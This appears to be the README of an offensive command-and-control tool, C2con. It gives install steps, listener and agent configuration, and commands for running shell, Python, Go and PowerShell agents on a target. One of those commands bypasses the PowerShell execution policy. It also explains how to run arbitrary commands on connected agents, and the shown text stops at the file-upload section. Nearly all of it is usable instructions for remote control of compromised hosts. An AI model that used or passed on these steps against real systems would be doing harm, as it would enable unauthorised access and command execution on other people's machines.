yep not a readme.md ... conformist...  -_-

Absolutly not FUD, not OPSEC, not whatever.. it just werks.. shhh.. un C2 sur le principe c'est tout con ;)
Should run directly on a recent kali vm.
Here some deps if you want to try to run it somewhere else : python3.x, django, tmux, php, apache

--[OPTIONAL : Before running]--

Change apache private tmp file to false if you plan to use the php listener or the web interface

vim /lib/systemd/system/apache2.service
systemctl daemon-reload
service apache2 restart


--[Install and Run C2]--

git clone https://github.com/Ug0Security/C2con/
cd C2con/
bash install.sh
cd scripts/
bash C2.sh



--[Create Listener]--

action = create
what = listener
type = python or php
endpoint = what you want (need to fit the agent)
Mode Param = what you want (need to fit the agent)
Response Param = what you want (need to fit the agent)
Listener Port  =  what you want (need to fit the agent)

The listener is launched upon creation, Listener Port option is for python only, for php it depends on your apache config

--[Create Agent]--

action = create
what = agent
type = shell or python or go or  powershell
filename = what you want
endpoint = what you want (need to fit the listener)
Mode Param = what you want (need to fit the listener)
Response Param = what you want (need to fit the listener)
Listener Port =  what you want (need to fit the listener)

the created agent is stored in /tmp/$filename.

--[Run Agent On Target]--

bash /tmp/hehe.sh 123 http://127.0.0.1:8888
python /tmp/hehe.py 123 http://127.0.0.1:8888
go run /tmp/hehe.go 123 http://127.0.0.1:8888
powershell -noexit -nologo -executionpolicy bypass -File .\hehe.ps1 123 http://127.0.0.1:8888

--[Run Commands On Connected Agent]--

action = run
agent  = agentID
Ze juice = $Cmd_To_Run

Wait up to 10 second to get the output

--[Upload File To Agent]--
